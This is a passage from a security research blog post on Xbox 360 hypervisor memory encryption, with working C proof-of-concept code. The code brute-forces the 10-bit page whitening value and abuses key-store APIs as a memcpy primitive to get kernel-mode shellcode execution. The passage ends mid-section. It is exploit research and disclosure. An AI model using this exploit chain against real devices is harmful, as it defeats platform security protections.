					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p></div>
				</td>
						<td><div><p><span>struct</span><span> </span><span>PAGE_WHITENING_TABLE_ENTRY</span></p><p><span>{</span></p><p><span>	</span><span>WORD</span><span> </span><span>WhiteningValue</span><span> </span><span>:</span><span> </span><span>10</span><span>;</span></p><p><span>	</span><span>WORD</span><span> </span><span>WhiteningOverflow</span><span> </span><span>:</span><span> </span><span>1</span><span>;</span></p><p><span>	</span><span>WORD</span><span> </span><span>Valid</span><span> </span><span>:</span><span> </span><span>1</span><span>;</span></p><p><span>}</span><span>;</span></p><p><span>DWORD </span><span>HvpSetPageWhiteningBits</span><span>(</span><span>PAGE_WHITENING_TABLE_ENTRY</span><span>*</span><span> </span><span>pPageAllocationTablePtr</span><span>,</span><span> </span><span>DWORD </span><span>pageNumber</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>WORD</span><span> </span><span>whiteningValue</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span></p><p><span>	</span><span>// Get the whitening entry for the page.</span></p><p><span>	</span><span>PAGE_WHITENING_TABLE_ENTRY</span><span>*</span><span> </span><span>pPageEntry</span><span> </span><span>=</span><span> </span><span>&amp;</span><span>pPageWhiteningTablePtr</span><span>[</span><span>pageNumber</span><span>]</span><span>;</span></p><p><span>	</span><span>// Check if the whitening values have all been used at least once.</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>pPageEntry</span><span>-&gt;</span><span>WhiteningOverflow</span><span> </span><span>==</span><span> </span><span>0</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>// Use the next whitening value until overflow is triggered.</span></p><p><span>		</span><span>whiteningValue</span><span> </span><span>=</span><span> </span><span>pPageEntry</span><span>-&gt;</span><span>WhiteningBits</span><span>++</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>else</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>// Randomize the whitening value.</span></p><p><span>		</span><span>XeCryptRandom</span><span>(</span><span>&amp;</span><span>whiteningValue</span><span>,</span><span> </span><span>sizeof</span><span>(</span><span>whiteningValue</span><span>)</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>// Isolate and return the 10-bit whitening value.</span></p><p><span>	</span><span>return</span><span> </span><span>whiteningValue</span><span> </span><span>&amp;</span><span> </span><span>0x3FF</span><span>;</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>The purpose of this function is to introduce entropy into the encryption used across allocations of the same page of memory. Each time the page is allocated the ciphertext will change even if the plaintext data doesn’t.</p>



<h3>A Hypothetical Attack Scenario</h3>



<p>While it may seem like all the per-boot/per-pathway/per-page encryption feeds make it difficult to perform ciphertext attacks this is actually quite easy to defeat. Sure we could just change the ciphertext arbitrarily and the resulting plaintext would change as well. But this doesn’t give us any control over what the resulting plaintext data will be and trying to brute force out even 16 bytes of random data that happens to give us some 16 bytes of plaintext data we want isn’t really feasible. </p>



<p>However, say we have some way to get the ciphertext for arbitrary plaintext data even though we don’t know what whitening value was used to create the ciphertext. For any given address there’s only 1024 possible ciphertext values for any constant plaintext data because the only entropy into the memory encryption will be the 10-bit whitening value. 10-bits is a very small search space and could easily be brute forced through in seconds to minutes if we had some primitive to cycle the whitening value and encrypt some known plaintext data.</p>



<p>Consider the following attack scenario:</p>



<ol>
<li>Choose some 64KB page of memory at address A such that A falls within the executable region for some executable file (could be a game executable or dll).</li>



<li>Get the ciphertext for all possible whitening values for the plaintext data we want to write into memory at address A (this would be our kernel mode shell code). There will be exactly 1024 different ciphertext values.</li>



<li>Load a game executable or dll into memory (a dll is easier because it can be loaded in a suspended state).</li>



<li>Loop for 1024 times and perform the following:
<ol>
<li>Write the next block of ciphertext to memory and flush CPU cache. This can be done using a DMA operation from another device such as the GPU or southbridge (remember this memory is read-only in kernel mode from the CPU’s perspective).</li>



<li>Read back the plaintext data using the encrypted pathway (basically just perform a normal memory read from kernel mode) and check it matches the expected plaintext data. </li>



<li>If the whitening value currently being used for the page of memory doesn’t match the whitening value used to generate the ciphertext then the resulting plaintext data will be garbage. Only once the whitening values match will the plaintext data be correct (i.e.: data was decrypted successfully).</li>



<li>Once the plaintext data is valid we have successfully overwritten encrypted memory with our own arbitrary data. Since we’re overwriting kernel mode code we can now execute this memory in kernel mode and run small amounts of our own arbitrary code.</li>
</ol>
</li>
</ol>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b8036b&quot;}" data-wp-interactive="core/image"><img fetchpriority="high" decoding="async" width="1116" height="393" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/kernel_code_exec_attack-4.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/kernel_code_exec_attack-4.png 1116w, https://icode4.coffee/wp-content/uploads/kernel_code_exec_attack-4-300x106.png 300w, https://icode4.coffee/wp-content/uploads/kernel_code_exec_attack-4-768x270.png 768w" sizes="(max-width: 1116px) 100vw, 1116px"><figcaption>Figure 1: Kernel mode code execution attack scenario</figcaption></figure></div>


<p>The only missing primitive here is a way to generate ciphertext for some arbitrary plaintext data.</p>



<h2>Crafting Ciphertext</h2>



<p>The primary source of ciphertext for the encrypted pathway is kernel mode code which must be RSA signed by Microsoft. However, tracing all the references to the <code>HvpSetPageWhiteningBits</code> function I found another code path that would work in my favor. The hypervisor implements three system calls that can be used to reserve, encrypt, and release an allocation in encrypted memory at an arbitrary address called <code>HvxEncryptedReserveAllocation</code>, <code>HvxEncryptedEncryptAllocation</code>, and <code>HvxEncryptedReleaseAllocation</code>.</p>



<p>The hypervisor enforces that all executable code is encrypted at runtime and the only memory that’s not encrypted is kernel mode data. This is mostly because data allocations may be used with external devices such as the GPU, southbridge, audio encoder, etc. which have no ability to perform decryption on the data. However, Microsoft wanted to give developers the ability to store data in encrypted memory and created the HvxEncrypted* API set. I’m not entirely sure what the attack scenario would be where one would want to use these APIs, presumably to hide some game data (cryptographic keys maybe?) at runtime from anyone who could dump the contents of RAM from outside the CPU. I can’t really think of any data that would justify the need for these APIs and I honestly don’t know if any game ever used them, but they certainly came in handy for exploitation.</p>



<p>The HvxEncrypted* APIs are pretty simple to use, you start by making a physical memory allocation using the unprotected pathway at the physical memory location you want to generate ciphertext for. Next you pass this address to <code>HvxEncryptedReserveAllocation</code> which marks the pages as in-use, followed by a call to <code>HvxEncryptedEncryptAllocation</code> which sets the page whitening bits and flushes CPU cache. At this point you now have two “views” of the same physical memory location, one through the unprotected pathway using the physical memory allocation address, and one through the encrypted pathway using a virtual address mapped by <code>HvxEncryptedReserveAllocation</code>.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b81401&quot;}" data-wp-interactive="core/image"><img decoding="async" width="785" height="246" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/multiple_pathways-4.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/multiple_pathways-4.png 785w, https://icode4.coffee/wp-content/uploads/multiple_pathways-4-300x94.png 300w, https://icode4.coffee/wp-content/uploads/multiple_pathways-4-768x241.png 768w" sizes="(max-width: 785px) 100vw, 785px"><figcaption>Figure 2: Multiple pathways to the same memory location</figcaption></figure></div>


<p>Using these APIs we can craft the ciphertext for arbitrary data by simply writing our plaintext data using the encrypted address, flushing CPU cache, and reading back from the unprotected address. We won’t know what whitening value was used for the encryption but that doesn’t matter. We can simply generate the ciphertext for the data we plan to overwrite and use it as an indicator to know when the whitening value currently in use matches the whitening value used to generate our malicious ciphertext. I’ll hereby refer to this indicator data as our “oracle” data (not to be confused with an oracle machine) as it’s essentially guiding us to finding a whitening value collision.</p>



<h2>Overwriting Read-Only Memory</h2>



<p>The memory we want to overwrite with our malicious ciphertext is executable code which is marked read-only in kernel mode, so we’ll need to find a way to work around this. There are a couple different techniques I’ve used to overwrite arbitrary memory while ignoring page permissions:</p>



<ul>
<li>Southbridge DMA operations
<ul>
<li>The CPU communicates with peripheral devices such as the disc drive, HDD, and network port through the southbridge. By setting up Direct Memory Access (DMA) operations with a peripheral device the southbridge can read and write to any location in RAM as specified by the request.</li>
</ul>
</li>



<li>GPU shaders
<ul>
<li>The Xbox 360 uses a unified memory model which means the GPU doesn’t have dedicated VRAM, and instead accesses main RAM directly. The GPU also implements a feature called “memory export shaders” which are similar to modern day fragment shaders. These shaders allow the GPU to write back to RAM to create vertex, index, or texture buffers dynamically. By crafting a special shader it’s possible to use it as a memcpy primitive to read and write to anywhere in RAM.</li>
</ul>
</li>



<li>Hypervisor APIs
<ul>
<li>There are a few places where the hypervisor will perform reads and writes to unprotected memory addresses in order to read/write input and output parameters for certain system calls. By finding some APIs that can be used together you can craft a memcpy primitive by calling the APIs in a loop to copy data between two unprotected memory addresses.</li>
</ul>
</li>
</ul>



<p>I’ll cover each of these techniques in-depth in part 3, but for now I’m going to focus on the hypervisor APIs technique as this is what I used for the exploit.</p>



<h3>Hypervisor Key Storage</h3>



<p>When running in hypervisor mode all memory is considered read-write-execute. If you can find one or more APIs that work as a “read from address A write to address B” primitive you can have the hypervisor do the memcpy operation for you. There are a few places where the hypervisor will perform reads and writes to memory addresses provided by kernel mode using the unprotected pathway. However, I only found two particular APIs that would actually work for a viable memcpy operation: <code>HvxKeysExGetKey</code> and <code>HvxKeysExSetKey</code>.</p>



<p>These two APIs are used to get and set keys in the extended key store that the hypervisor manages. Almost all of the keys in the normal and extended key stores are not accessible to kernel mode and the ones that are accessible are typically read-only. However, the extended key store has a couple keys that are both accessible and writable from kernel mode. I’m not sure what the key slots are supposed to be used for (perhaps IP-TV keys/certificates) but the slot is writable and that’s all that matters.</p>



<p>By calling <code>HvxKeysExSetKey</code> we can store the data we want to write into the extended key store, and call <code>HvxKeysExGetKey</code> to retrieve it. When the retrieval happens the hypervisor will write the key value to the memory address provided by kernel mode using the unprotected pathway. As long as the memory address is outside of the hypervisor address space it’ll write to any memory location you specify. By putting these two APIs into a loop you can create an arbitrary memcpy primitive:</p>



<div id="urvanov-syntax-highlighter-67c61f5b71669367715360" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p></div>
				</td>
						<td><div><p><span>void</span><span> </span><span>MemcpyCipherText</span><span>(</span><span>ULONG </span><span>DstPhys</span><span>,</span><span> </span><span>ULONG </span><span>SrcPhys</span><span>,</span><span> </span><span>ULONG </span><span>size</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>while</span><span> </span><span>(</span><span>size</span><span> </span><span>&gt;</span><span> </span><span>0</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>// Setup next block size.</span></p><p><span>		</span><span>ULONG </span><span>copySize</span><span> </span><span>=</span><span> </span><span>min</span><span>(</span><span>size</span><span>,</span><span> </span><span>2048</span><span>)</span><span>;</span></p><p><span>		</span><span>*</span><span>(</span><span>ULONG</span><span>*</span><span>)</span><span>pSizeScratch</span><span> </span><span>=</span><span> </span><span>copySize</span><span>;</span></p><p><span>		</span><span>// Store the next block to the key store and read it back to the target address.</span></p><p><span>		</span><span>ULONG </span><span>result</span><span> </span><span>=</span><span> </span><span>HvxKeysExSetKey</span><span>(</span><span>0x102</span><span>,</span><span> </span><span>SrcPhys</span><span>,</span><span> </span><span>copySize</span><span>)</span><span>;</span></p><p><span>		</span><span>result</span><span> </span><span>=</span><span> </span><span>HvxKeysExGetKey</span><span>(</span><span>0x102</span><span>,</span><span> </span><span>DstPhys</span><span>,</span><span> </span><span>SizeScratchPhysAddr</span><span>)</span><span>;</span></p><p><span>		</span><span>SrcPhys</span><span> </span><span>+=</span><span> </span><span>copySize</span><span>;</span></p><p><span>		</span><span>DstPhys</span><span> </span><span>+=</span><span> </span><span>copySize</span><span>;</span></p><p><span>		</span><span>size</span><span> </span><span>-=</span><span> </span><span>copySize</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<h2>Getting Kernel Mode Code Execution</h2>



<p>Now that we have a way to generate ciphertext for arbitrary data and write it to read-only memory it’s time to put everything together and get some arbitrary kernel mode code execution. Since I was testing this on an already hacked console I was able to write the poc for this in C code which I’ve included below. The steps I used for this attack are slightly different than the ones I outlined above but ultimately arrives at the same result.</p>



<p>First we’ll need an executable file we can load and unload dynamically. I chose to use the boot animation dll because it’s stored in system flash (so it exists on every console), can be loaded in a suspended state, and doesn’t terminate the executable that’s currently running. Then I chose the address of some executable code in the dll, <code>0x98030000</code>, to overwrite with my shell code. The address of any 64KB page of executable code will work.</p>



<h3>Getting the Oracle Data</h3>



<p>Next we’ll need to get some 16 bytes of plaintext data from the boot animation at the chosen target address (<code>0x98030000</code>), which we’ll use to create our oracle ciphertext data. We’ll also get the physical memory address our target address maps to which we’ll need later on.</p>



<div id="urvanov-syntax-highlighter-67c61f5b7168d603547955" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					
				</td>
						<td><div><p><span>// Load the boot animation so we can get the physical address of the last code segment.</span></p><p><span>DWORD </span><span>result</span><span> </span><span>=</span><span> </span><span>XexLoadImage</span><span>(</span><span>"Flash:\\bootanim.xex"</span><span>,</span><span> </span><span>0x40000009</span><span>,</span><span> </span><span>0</span><span>,</span><span> </span><span>&amp;</span><span>hBootAnim</span><span>)</span><span>;</span></p><p><span>// Get the physical address of the last code segment.</span></p><p><span>DWORD </span><span>codePhysAddr</span><span> </span><span>=</span><span> </span><span>MmGetPhysicalAddress</span><span>(</span><span>(</span><span>void</span><span>*</span><span>)</span><span>0x98030000</span><span>)</span><span>;</span></p><p><span>// Copy the data at this address to use as our whitening oracle.</span></p><p><span>memcpy</span><span>(</span><span>abOracleData</span><span>,</span><span> </span><span>(</span><span>void</span><span>*</span><span>)</span><span>0x98030000</span><span>,</span><span> </span><span>16</span><span>)</span><span>;</span></p><p><span>// Unload the boot animation so we can reclaim the memory.</span></p><p><span>result</span><span> </span><span>=</span><span> </span><span>XexUnloadImage</span><span>(</span><span>hBootAnim</span><span>)</span><span>;</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<h3>Generating Our Ciphertext</h3>



<p>Next we loop 1024 times and allocate encrypted memory at the chosen target address. This will exhaust the whitening values for the chosen 64KB page and cause the overflow bit to get set such that each subsequent allocation of the page will use a random whitening value. For each iteration we’ll have two addresses to the same physical memory location, an unprotected address which just fetches whatever data is in RAM, and an encrypted address which will encrypt/decrypt data from RAM on access.</p>



<p>After ~50% of the search space has been used (so around i=512) we’ll write the plaintext oracle data to the encrypted address and read back the corresponding ciphertext from the unprotected address. We’ll do the same operation again for the shell code we want to write to memory and capture the corresponding ciphertext. We now have the ciphertext for the oracle data, and the ciphertext for our shell code at virtual address <code>0x98030000</code> for some unknown whitening value (presumably it’s 513 but it doesn’t really matter).</p>



<div id="urvanov-syntax-highlighter-67c61f5b71693813996851" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p><p>38</p><p>39</p><p>40</p><p>41</p><p>42</p><p>43</p><p>44</p><p>45</p><p>46</p><p>47</p><p>48</p><p>49</p><p>50</p><p>51</p><p>52</p><p>53</p></div>
				</td>
						<td><div><p><span>bool</span><span> </span><span>GetPayloadCipherText</span><span>(</span><span>DWORD </span><span>TargetPhysicalAddr</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>// Arbitrary virtual address that will get mapped through the encrypted pathway to TargetPhysicalAddr.</span></p><p><span>	</span><span>BYTE</span><span> </span><span>*</span><span>pEncryptedAddress</span><span> </span><span>=</span><span> </span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>0x8D000000</span><span>;</span></p><p><span>	</span><span>// Allocate physical memory (through the unprotected pathway) for the target address we want to encrypt data at.</span></p><p><span>	</span><span>BYTE</span><span>*</span><span> </span><span>pUnprotectedAddress</span><span> </span><span>=</span><span> </span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>XPhysicalAlloc</span><span>(</span><span>0x10000</span><span>,</span><span> </span><span>(</span><span>ULONG_PTR</span><span>)</span><span>TargetPhysicalAddr</span><span>,</span><span> </span><span>0x10000</span><span>,</span><span> </span><span>PAGE_READWRITE</span><span> </span><span>|</span><span> </span><span>MEM_LARGE_PAGES</span><span>)</span><span>;</span></p><p><span>	</span><span>// Loop and exhaust all possible whitening values for the memory address.</span></p><p><span>	</span><span>for</span><span> </span><span>(</span><span>int</span><span> </span><span>i</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>1024</span><span>;</span><span> </span><span>i</span><span>++</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>// Allocate encrypted memory.</span></p><p><span>		</span><span>DWORD </span><span>result</span><span> </span><span>=</span><span> </span><span>HvxEncryptedReserveAllocation</span><span>(</span><span>(</span><span>DWORD</span><span>)</span><span>pEncryptedAddress</span><span>,</span><span> </span><span>TargetPhysicalAddr</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>		</span><span>result</span><span> </span><span>=</span><span> </span><span>HvxEncryptedEncryptAllocation</span><span>(</span><span>(</span><span>DWORD</span><span>)</span><span>pEncryptedAddress</span><span>)</span><span>;</span></p><p><span>		</span><span>// Wait until we exhaust ~50% of the whitening space before capturing cipher text.</span></p><p><span>		</span><span>if</span><span> </span><span>(</span><span>i</span><span> </span><span>==</span><span> </span><span>1024</span><span> </span><span>/</span><span> </span><span>2</span><span>)</span></p><p><span>		</span><span>{</span></p><p><span>			</span><span>// Pass 1: copy the oracle data that will be loaded at this address when bootanim.xex is loaded.</span></p><p><span>			</span><span>memcpy</span><span>(</span><span>pEncryptedAddress</span><span>,</span><span> </span><span>abOracleData</span><span>,</span><span> </span><span>16</span><span>)</span><span>;</span></p><p><span>			</span><span>// Flush cache and read back ciphertext.</span></p><p><span>			</span><span>KeFlushCacheRange</span><span>(</span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>pEncryptedAddress</span><span>,</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>			</span><span>KeFlushCacheRange</span><span>(</span><span>pUnprotectedAddress</span><span>,</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>			</span><span>memcpy</span><span>(</span><span>pPayloadCipherText</span><span>,</span><span> </span><span>pUnprotectedAddress</span><span>,</span><span> </span><span>16</span><span>)</span><span>;</span></p><p><span>			</span><span>// Pass 2: copy our shell code to the target address we want to overwrite.</span></p><p><span>			</span><span>memset</span><span>(</span><span>pEncryptedAddress</span><span>,</span><span> </span><span>0x41</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>			</span><span>ReadFile</span><span>(</span><span>"game:\\shell_code.bin"</span><span>,</span><span> </span><span>pEncryptedAddress</span><span>,</span><span> </span><span>0</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>			</span><span>// Flush cache and read back ciphertext.</span></p><p><span>			</span><span>KeFlushCacheRange</span><span>(</span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>pEncryptedAddress</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>			</span><span>KeFlushCacheRange</span><span>(</span><span>pUnprotectedAddress</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>			</span><span>memcpy</span><span>(</span><span>pPayloadCipherText</span><span> </span><span>+</span><span> </span><span>0x80</span><span>,</span><span> </span><span>pUnprotectedAddress</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>		</span><span>}</span></p><p><span>		</span><span>// Free the encrypted allocation.</span></p><p><span>		</span><span>result</span><span> </span><span>=</span><span> </span><span>HvxEncryptedReleaseAllocation</span><span>(</span><span>(</span><span>DWORD</span><span>)</span><span>pEncryptedAddress</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>XPhysicalFree</span><span>(</span><span>pUnprotectedAddress</span><span>)</span><span>;</span></p><p><span>	</span><span>return</span><span> </span><span>true</span><span>;</span></p><p><span>}</span></p><p><span>// Allocate physical memory for the shell code cipher text.</span></p><p><span>pPayloadCipherText</span><span> </span><span>=</span><span> </span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>XPhysicalAlloc</span><span>(</span><span>0x10080</span><span>,</span><span> </span><span>MAXULONG_PTR</span><span>,</span><span> </span><span>0x80</span><span>,</span><span> </span><span>PAGE_READWRITE</span><span> </span><span>|</span><span> </span><span>MEM_LARGE_PAGES</span><span>)</span><span>;</span></p><p><span>// Get the physical address of the shell code cipher text buffer.</span></p><p><span>PayloadCipherTextPhysAddr</span><span> </span><span>=</span><span> </span><span>MmGetPhysicalAddress</span><span>(</span><span>pPayloadCipherText</span><span>)</span><span>;</span></p><p><span>// Find the cipher text for the data we want to overwrite.</span></p><p><span>GetPayloadCipherText</span><span>(</span><span>codePhysAddr</span><span>)</span><span>;</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<h3>Finding a Whitening Value Collision</h3>



<p>Finally, in an infinite loop we’ll load the boot animation dll and check the ciphertext for our chosen target address <code>0x98030000</code>. If it matches our oracle ciphertext we know the 64KB page was encrypted using the same whitening value that was used to generate our malicious ciphertext, and we can now write the ciphertext for our shell code to memory. If the oracle data doesn’t match it means a different whitening value was used and we’ll unload the boot animation dll and try again. Once we get a hit we can use the hypervisor extended key store memcpy technique to copy the ciphertext for our shell code to the 64KB executable page which is marked read-only. Then we just jump to the address <code>0x98030000</code> and our shell code will execute.</p>



<div id="urvanov-syntax-highlighter-67c61f5b71696367930165" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p></div>
				</td>
						<td><div><p><span>// Loop and load the boot animation until we find the correct whitening bits.</span></p><p><span>DWORD </span><span>count</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span></p><p><span>while</span><span> </span><span>(</span><span>true</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>// Load the boot animation.</span></p><p><span>	</span><span>result</span><span> </span><span>=</span><span> </span><span>XexLoadImage</span><span>(</span><span>"Flash:\\bootanim.xex"</span><span>,</span><span> </span><span>0x40000009</span><span>,</span><span> </span><span>0</span><span>,</span><span> </span><span>&amp;</span><span>hBootAnim</span><span>)</span><span>;</span></p><p><span>	</span><span>// Get the cipher text for the target address.</span></p><p><span>	</span><span>MemcpyCipherText</span><span>(</span><span>PayloadCipherTextPhysAddr</span><span> </span><span>+</span><span> </span><span>16</span><span>,</span><span> </span><span>codePhysAddr</span><span>,</span><span> </span><span>16</span><span>)</span><span>;</span></p><p><span>	</span><span>KeFlushCacheRange</span><span>(</span><span>pPayloadCipherText</span><span>,</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>	</span><span>// Check if the ciphertext in memory matches the oracle ciphertext we generated earlier.</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>memcmp</span><span>(</span><span>pPayloadCipherText</span><span>,</span><span> </span><span>pPayloadCipherText</span><span> </span><span>+</span><span> </span><span>16</span><span>,</span><span> </span><span>16</span><span>)</span><span> </span><span>==</span><span> </span><span>0</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>// Overwrite the boot animation code with our shell code ciphertext and flush cache.</span></p><p><span>		</span><span>MemcpyCipherText</span><span>(</span><span>codePhysAddr</span><span>,</span><span> </span><span>PayloadCipherTextPhysAddr</span><span> </span><span>+</span><span> </span><span>0x80</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>		</span><span>KeFlushCacheRange</span><span>(</span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>0x98030000</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>		</span><span>HvxFlushDCacheRange</span><span>(</span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>codePhysAddr</span><span>,</span><span> </span><span>0x10000</span><span>)</span><span>;</span></p><p><span>		</span><span>// Call our payload.</span></p><p><span>		</span><span>ULONG</span><span> </span><span>(</span><span>__stdcall</span><span> </span><span>*</span><span>pPayloadFunc</span><span>)</span><span>(</span><span>)</span><span> </span><span>=</span><span> </span><span>(</span><span>ULONG</span><span>(</span><span>__stdcall</span><span>*</span><span>)</span><span>(</span><span>)</span><span>)</span><span>0x98030000</span><span>;</span></p><p><span>		</span><span>result</span><span> </span><span>=</span><span> </span><span>pPayloadFunc</span><span>(</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>// Unload the boot animation.</span></p><p><span>	</span><span>result</span><span> </span><span>=</span><span> </span><span>XexUnloadImage</span><span>(</span><span>hBootAnim</span><span>)</span><span>;</span></p><p><span>	</span><span>count</span><span>++</span><span>;</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>With everything in place I wrote a small piece of assembly code that would set the console’s ring of light to full orange to know when it executed. I ran the exploit and after 30 seconds to a minute it was able to find a whitening value collision and my assembly code ran. I captured a view of the code from a debugger which you can see here:</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b82425&quot;}" data-wp-interactive="core/image"><img decoding="async" width="670" height="539" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/image.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/image.png 670w, https://icode4.coffee/wp-content/uploads/image-300x241.png 300w" sizes="(max-width: 670px) 100vw, 670px"><figcaption>Figure 3: Kernel mode shell code as seen by the debugger</figcaption></figure></div>


<p>Now that I had a way to attack encrypted memory it was time to loop back to the notable XKE payload and see if attacking it was feasible.</p>



<figure><div>
<blockquote data-width="470" data-dnt="true"><p lang="en" dir="ltr">I can now get up to 64kb of arbitrary kernel mode code execution on 360 but still no hv code exec. I'm starting to run out of unhinged attack ideas…</p>— Ryan M (@Grimdoomer) <a href="https://twitter.com/Grimdoomer/status/1832178471881282035?ref_src=twsrc%5Etfw">September 6, 2024</a></blockquote>
</div></figure>



<h2 id="bootloader-update-payload">The Bootloader Update Payload</h2>



<p>This notable XKE payload that I’ll refer to as the “bootloader update payload” is used during system updates when the 2nd stage bootloader (2bl) needs to be updated. The reason this payload is interesting is because it reads in data from kernel mode and performs LZX decompression on it. The decompression process requires a scratch buffer to store the LZX decoder context structure which contains various pointers that the hypervisor will use when decompressing data. This scratch buffer is provided by kernel mode and relocated to <strong>encrypted memory</strong>, which means it doesn’t have any integrity checks and we can attack it from kernel mode asynchronously.</p>



<div id="urvanov-syntax-highlighter-67c61f5b7169c514080037" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p></div>
				</td>
